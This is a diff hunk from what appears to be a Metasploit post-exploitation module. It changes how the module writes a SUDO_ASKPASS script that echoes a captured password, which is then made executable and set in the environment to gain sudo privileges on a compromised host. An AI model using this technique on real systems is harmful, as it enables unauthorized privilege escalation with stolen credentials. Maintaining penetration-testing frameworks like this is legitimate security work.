@@ -98,8 +98,7 @@ class MetasploitModule < Msf::Post
         # Need to timeout in case there's a blocking prompt after all
         ::Timeout.timeout(120) do
           vprint_status "Writing the SUDO_ASKPASS script: #{askpass_sh}"
-          cmd_exec("echo \\#\\!/bin/sh > #{askpass_sh}") # Cursed csh
-          cmd_exec("echo echo #{password} >> #{askpass_sh}")
+          write_file(askpass_sh, "#!/bin/sh\necho '#{password}'\n")
           vprint_status "Setting executable bit."
           cmd_exec("chmod +x #{askpass_sh}")
           vprint_status "Setting environment variable."
